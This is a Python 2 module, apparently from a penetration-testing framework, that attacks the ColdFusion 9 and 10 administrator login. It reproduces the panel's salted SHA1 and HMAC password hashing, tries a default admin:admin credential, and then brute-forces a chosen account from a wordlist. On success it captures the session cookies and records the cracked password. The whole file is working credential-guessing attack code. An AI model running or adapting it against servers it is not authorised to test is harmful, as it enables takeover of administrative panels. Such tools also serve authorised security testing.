from requests.auth import HTTPDigestAuth
from requests.utils import dict_from_cookiejar
from log import LOG
from sys import stdout
from hashlib import sha1
from re import findall
import hmac
import utility
import state

default_credentials = [("admin", "admin")]

def _salt(url):
    """ ColdFusion requires a salt that it uses client-side and sends
    back to the server, which it is expecting.  We can obtain the next salt
    by simply requesting it.
    """

    r = utility.requests_get(url)
    if r.status_code is 200:

        salt = findall("name=\"salt\" type=\"hidden\" value=\"(.*?)\">", r.content)
        return salt[0]


def _auth(usr, pswd, url, version):
    """ Authenticate to the remote ColdFusion server; bit of a pain 
    """

    if version in ['9.0']:
        salt = _salt(url) 
        hsh = hmac.new(salt, sha1(pswd).hexdigest().upper(), sha1).hexdigest().upper()
        data = {"cfadminPassword" : hsh,
                "requestedURL" : "/CFIDE/administrator/enter.cfm?",
                "cfadminUserId" : usr,
                "salt" : salt,
                "submit" : "Login"
               }

    elif version in ['10.0']:
        
        hsh = sha1(pswd).hexdigest().upper()
        data = {'cfadminPassword' : hsh,
                'requestedURL' : '/CFIDE/administrator/enter.cfm?',
                'cfadminUserId' : usr,
                'submit' : 'Login'
               }

    try:
        res = utility.requests_post(url, data=data)
        if res.status_code is 200 and len(res.history) > 0:
            utility.Msg("Successfully authenticated with %s:%s" % (usr, pswd), LOG.DEBUG)
            return (dict_from_cookiejar(res.history[0].cookies), None)

    except Exception, e:
        utility.Msg("Error authenticating: %s" % e, LOG.ERROR)
        return (None, None)


def checkAuth(ip, port, title, version):
    """
    """

    url = "http://{0}:{1}/CFIDE/administrator/enter.cfm".format(ip, port)

    # check with given auth
    if state.usr_auth:
        (usr, pswd) = state.usr_auth.split(':')
        return _auth(usr, pswd, url, version)

    # else try default creds
    for (usr, pswd) in default_credentials:
        cook = _auth(usr, pswd, url, version)
        if cook:
            return cook

    # if we're still here, check if they supplied a wordlist
    if state.bf_wordlist and not state.hasbf:

        state.hasbf = True
        wordlist = []
        try:
            with open(state.bf_wordlist, 'r') as f:
                # ensure everything is ascii or requests will explode
                wordlist = [x.decode('ascii', 'ignore').rstrip() for x in f.readlines()]
        except Exception, e:
            utility.Msg("Failed to read wordlist (%s)" % e, LOG.ERROR)
            return

        utility.Msg("Brute forcing account %s with %d passwords..." %
                                (state.bf_user, len(wordlist)), LOG.DEBUG)

        try:

            for (idx, word) in enumerate(wordlist):
                stdout.flush()
                stdout.write("\r\033[32m [%s] Brute forcing password for %s [%d/%d]\033[0m"\
                                % (utility.timestamp(), state.bf_user, idx+1,
                                   len(wordlist)))

                cook = _auth(state.bf_user, word, url, version)
                if cook:
                    print '' # newline

                    if not (state.bf_user, word) in default_credentials:
                        default_credentials.insert(0, (state.bf_user, word))

                    utility.Msg("Successful login %s:%s" %
                                        (state.bf_user, word), LOG.SUCCESS)
                    return cook

            print ''

        except KeyboardInterrupt:
            pass
